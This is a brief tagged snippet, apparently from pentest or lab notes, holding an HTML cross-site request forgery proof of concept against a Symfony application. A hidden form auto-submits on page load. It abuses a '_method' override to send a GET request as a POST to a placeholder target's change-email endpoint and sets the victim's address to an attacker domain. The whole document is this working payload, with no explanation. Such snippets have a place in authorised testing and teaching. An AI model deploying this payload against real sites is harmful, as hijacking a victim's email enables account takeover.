#csrf #symfony

```html
<form class="login-form" action="https://[TARGET_IP]/my-account/change-email" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input hidden required type="email" name="email" value="modified@attacker.hack">
</form>
<script>document.forms[0].submit()</script>
```